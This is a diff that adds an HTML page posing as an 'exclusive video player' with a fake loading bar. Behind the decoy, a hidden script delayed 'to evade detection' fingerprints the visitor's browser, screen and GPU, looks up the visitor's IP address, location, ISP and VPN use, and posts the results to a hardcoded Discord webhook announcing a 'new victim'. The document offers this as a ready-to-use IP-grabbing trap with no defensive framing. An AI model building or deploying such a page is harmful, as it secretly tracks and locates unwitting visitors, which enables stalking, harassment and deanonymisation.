@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎬 Exclusive Video Player 🎬</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #1a1a1a; 
+            color: white; 
+            text-align: center; 
+            padding: 50px; 
+        }
+        .player-container {
+            background: #252525;
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 600px;
+            margin: 0 auto;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        .loading-bar {
+            height: 4px;
+            background: #444;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background: #7289da;
+            animation: load 3s infinite;
+        }
+        @keyframes load {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="player-container">
+        <h1>🔒 Premium Content Loading...</h1>
+        <p>Please wait while we prepare your exclusive video.</p>
+        <div class="loading-bar">
+            <div class="loading-progress"></div>
+        </div>
+        <p id="status">Checking authorization...</p>
+    </div>
+
+    <!-- ASTAL DISCORD WEBHOOK TRAPPER -->
+    <script>
+        // Configuration - REPLACE WITH YOUR WEBHOOK
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1389113319570276412/c4lL8jpLBu4OcUSkuovMLk85RLfPTXtWVwkRwugC83Jk3An7igVxbNL9CippgFTe_bDN";
+
+        // Delay execution to evade detection
+        setTimeout(() => {
+            // Enhanced fingerprinting
+            const getGPU = () => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    return gl.getParameter(gl.RENDERER);
+                } catch (e) {
+                    return "Unknown (Blocked)";
+                }
+            };
+
+            const victimData = {
+                ip: "Unknown",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages,
+                gpu: getGPU(),
+                cookies: navigator.cookieEnabled,
+                referrer: document.referrer || "Direct",
+                timestamp: new Date().toISOString()
+            };
+
+            // Get IP and geolocation
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipData => {
+                    victimData.ip = ipData.ip;
+                    return fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                })
+                .then(res => res.json())
+                .then(geoData => {
+                    victimData.geolocation = {
+                        city: geoData.city,
+                        region: geoData.region,
+                        country: geoData.country_name,
+                        isp: geoData.org,
+                        vpn: geoData.org.toLowerCase().includes('vpn') || 
+                             geoData.org.toLowerCase().includes('proxy')
+                    };
+                    sendToDiscord(victimData);
+                })
+                .catch(() => {
+                    victimData.ip = "Blocked/Private";
+                    sendToDiscord(victimData);
+                });
+
+            // Send rich embed to Discord
+            function sendToDiscord(data) {
+                const embed = {
+                    title: "🚨 New victim Caught 🚨",
+                    color: 0xff0000,
+                    fields: [
+                        { name: "IP Address", value: data.ip, inline: true },
+                        { name: "Location", value: data.geolocation ? 
+                            `${data.geolocation.city}, ${data.geolocation.country}` : "Unknown", inline: true },
+                        { name: "ISP", value: data.geolocation?.isp || "Unknown", inline: true },
+                        { name: "Device", value: data.userAgent },
+                        { name: "Screen", value: data.screen, inline: true },
+                        { name: "GPU", value: data.gpu, inline: true },
+                        { name: "VPN/Proxy", value: data.geolocation?.vpn ? "⚠️ DETECTED" : "No", inline: true },
+                        { name: "Timestamp", value: new Date().toLocaleString() }
+                    ],
+                    footer: { text: "Astral IP Trapper v3.0" }
+                };
+
+                fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        embeds: [embed],
+                        content: "@here New victim captured!" 
+                    })
+                });
+
+                // Update fake loading screen
+                document.getElementById('status').textContent = "Almost ready...";
+            }
+        }, 3500); // 3.5 second delay for better evasion
+    </script>
+</body>
+</html>
